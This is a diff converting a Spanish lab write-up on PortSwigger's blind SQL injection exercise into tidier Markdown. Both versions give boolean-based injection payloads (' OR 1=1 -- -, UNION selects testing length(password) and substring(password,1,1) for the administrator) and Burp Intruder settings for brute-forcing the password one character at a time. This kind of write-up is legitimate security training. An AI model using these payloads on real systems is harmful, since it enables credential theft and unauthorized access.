@@ -1,61 +1,198 @@
-[SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+# SQL Injection with Conditional Responses
 
-En el enunciado tenemos:  
-Necesitamos explotar la vulnerabilidad Blind SQL Injection de una tabla llamada `users` con las columnas `username` y `password` para poder sacar la contraseña del usuario `administrator`.
+## 📌 Lab Information
 
-Accedemos al portal e iniciaremos Burpsuite para hacerlo de una manera mas agil ya que necesitaremos interceptar la peticion ya que este metodo viaja mediante la cookie.
-![[Pasted image 20260406123145.png]]
+- **Lab:** SQL Injection with Conditional Responses
+- **Categoría:** Blind SQL Injection
+- **Técnica:** Boolean-Based SQLi
 
-Enviamos al modulo de Repeater con CTRL+R
-![[Pasted image 20260406123205.png]]
+🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
 
-Cuando enviamos una petición y obtenemos una respuesta positiva, el portal nos responde con el mensaje "Welcome Back"
-![[Pasted image 20260406123252.png]]
+---
 
-Para validar que sea vulnerable a una inyeccion SQL debemos realizarlo con una condicional, en este caso usaremos la vieja y confiable `' or 1=1 -- -` pero el payload debe viajar en urlEncode, por lo que deberemos seleccionar la cadena de texto (payload) y presionar las teclas CTRL+U
-![[Pasted image 20260406123423.png]]
+## 🎯 Objetivo
 
-	Realizamos la enumeración de usuario y contraseña, en el enunciado nos dice que podemos realizarlo con las columnas 'username' y 'password' desde la tabla 'users'
+Explotar una vulnerabilidad Blind SQL Injection para obtener la contraseña del usuario `administrator`.
 
-Sentencia: `' union select username from users where username='administrator' -- -`
+---
 
-Si esta sentencia nos devuelve una respuesta positiva, nos deberia devolver el mensaje "Welcome Back"
-![[Pasted image 20260406123621.png]]
+## 🔍 Interceptando la petición
 
-Ahora poder llegar a obtener la contraseña, deberemos conocer la longitud de la misma, para esto utilizaremos el condicional de length.
+Abrimos Burp Suite y activamos el proxy.
 
-	Sentencia: `' union select username from users where username='administrator' and length(password)=1 -- -`
+![Burp Proxy](Imagenes/pasted-image-20260406123145.png)
 
-Para esto podemos automatizarlo en el modulo intruder, enviaremos la peticion con la combinacion de teclas CTRL+i
-![[Pasted image 20260406125122.png]]
+Enviamos la petición al módulo Repeater con:
 
-En caso de que la peticion este seleccionada automaticamente, limpiaremos todo y seleccionamos solo el numero 1 para el parametro y nos aseguramos que tengamos el tipo de ataque en `Sniper`.
-![[Pasted image 20260406125136.png]]
+```text
+CTRL + R
+```
 
-En el modulo de Payloads seleccionaremos 'Numbers' en Type, en el Number range ingresaremos 1 en From y 30 en To con un step de 1 y de manera secuencial.
-![[Pasted image 20260406125233.png]]
+![Repeater](Imagenes/pasted-image-20260406123205.png)
 
-Y en el modulo de Setting en el Grep-Match limpiaremos todo y agregaremos el mensaje ok "Welcome Back" que sera nuestro filtro de respuesta correcta y le damos en iniciar ataque
-![[Pasted image 20260406125345.png]]
-![[Pasted image 20260406125602.png]]
+---
 
-Sabiendo que es 20, ahora modificaremos la condicional con subtring de la password en la posicion 1 con la longitud de 1 caracter e iniciamos probando con el caracter "a"
+## 🔍 Identificación de respuestas válidas
 
-Sentencia: ' union select username from users where username='administrator' and substring(password,1,1)='a' -- -
+Cuando la condición es correcta, el servidor responde con:
 
-Copiamos y pegamos la sentencia en el intruder, y los parámetros a modificar serán como primera posición el carácter 'a' y como segunda posición se dejara tal cual, y el tipo de ataque ya no será Sniper, sino `Cluster bomb` ya que tenemos sentenciados 2 parámetros para esta prueba.
+```text
+Welcome Back
+```
 
-ejemplo:
-![[Pasted image 20260406165808.png]]
+![Welcome Back](Imagenes/pasted-image-20260406123252.png)
 
-En el primer payload nos posicionaremos en el TO y pondremos 20 ya que es el largo maximo de la password y nos aseguramos de que este en tipo numeros
-![[Pasted image 20260406170349.png]]
+---
 
-Y en el segundo payload setearemos el tipo de payload en Brute forcer ya que este nos devolverá una lista de caracteres en minúsculas y números:
-![[Pasted image 20260406170510.png]]
+## 🚀 Validación SQL Injection
 
-y vamos anotando los que va encontrando:
-![[Pasted image 20260407004024.png]]
+Payload:
 
-Ingresamos con la password detectada y el usuario administrador para resolver el reto:
-![[Pasted image 20260407004121.png]]
+```sql
+' OR 1=1 -- -
+```
+
+Debemos URL Encodear el payload utilizando:
+
+```text
+CTRL + U
+```
+
+![Payload URL Encode](Imagenes/pasted-image-20260406123423.png)
+
+---
+
+## 🔍 Validando existencia del usuario administrator
+
+```sql
+' union select username from users where username='administrator' -- -
+```
+
+![Validación usuario](Imagenes/pasted-image-20260406123621.png)
+
+---
+
+# 🚀 Enumeración del largo de la password
+
+Payload:
+
+```sql
+' union select username from users where username='administrator' and length(password)=1 -- -
+```
+
+Enviamos la petición a Intruder:
+
+```text
+CTRL + I
+```
+
+![Intruder](Imagenes/pasted-image-20260406125122.png)
+
+---
+
+## ⚙️ Configuración Intruder
+
+Tipo de ataque:
+
+```text
+Sniper
+```
+
+![Sniper](Imagenes/pasted-image-20260406125136.png)
+
+---
+
+## 🔍 Configuración payloads
+
+- Tipo: Numbers
+- From: 1
+- To: 30
+
+![Payload Numbers](Imagenes/pasted-image-20260406125233.png)
+
+---
+
+## 🔍 Grep Match
+
+Agregamos:
+
+```text
+Welcome Back
+```
+
+![Grep Match](Imagenes/pasted-image-20260406125345.png)
+
+---
+
+## ✅ Resultado
+
+La contraseña tiene:
+
+```text
+20 caracteres
+```
+
+![Length Password](Imagenes/pasted-image-20260406125602.png)
+
+---
+
+# 🚀 Fuerza bruta carácter por carácter
+
+Payload:
+
+```sql
+' union select username from users where username='administrator' and substring(password,1,1)='a' -- -
+```
+
+---
+
+## ⚙️ Configuración Cluster Bomb
+
+Tipo de ataque:
+
+```text
+Cluster Bomb
+```
+
+![Cluster Bomb](Imagenes/pasted-image-20260406165808.png)
+
+---
+
+## 🔍 Payload posición
+
+Payload 1:
+- Numbers
+- 1 → 20
+
+![Payload Position](Imagenes/pasted-image-20260406170349.png)
+
+---
+
+## 🔍 Payload caracteres
+
+Payload 2:
+- Brute Forcer
+
+![Payload Characters](Imagenes/pasted-image-20260406170510.png)
+
+---
+
+## ✅ Enumeración
+
+![Enumeración Password](Imagenes/pasted-image-20260407004024.png)
+
+---
+
+## 🔓 Acceso administrador
+
+![Login exitoso](Imagenes/pasted-image-20260407004121.png)
+
+---
+
+## ✅ Resultado
+
+Se logró:
+- Enumerar longitud
+- Enumerar caracteres
+- Extraer password
+- Acceder como administrator
